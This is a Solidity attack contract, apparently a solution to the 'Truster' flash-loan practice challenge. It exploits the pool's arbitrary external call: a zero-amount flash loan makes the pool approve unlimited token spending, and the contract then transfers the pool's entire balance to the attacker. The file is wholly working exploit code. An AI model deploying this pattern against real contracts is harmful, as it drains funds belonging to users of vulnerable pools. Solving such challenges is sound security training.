pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    function attack(
        address victimAddress,
        address attackerAddress,
        address tokenAddress
    ) public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        TrusterLenderPool pool = TrusterLenderPool(victimAddress);

        // flashLoan -> makes the victim approve the attacker to transfer the tokens.
        pool.flashLoan(0, attackerAddress, tokenAddress, data);

        // Transfering funds
        IERC20 token = IERC20(tokenAddress);
        token.transferFrom(
            victimAddress,
            attackerAddress,
            token.balanceOf(victimAddress)
        );
    }
}
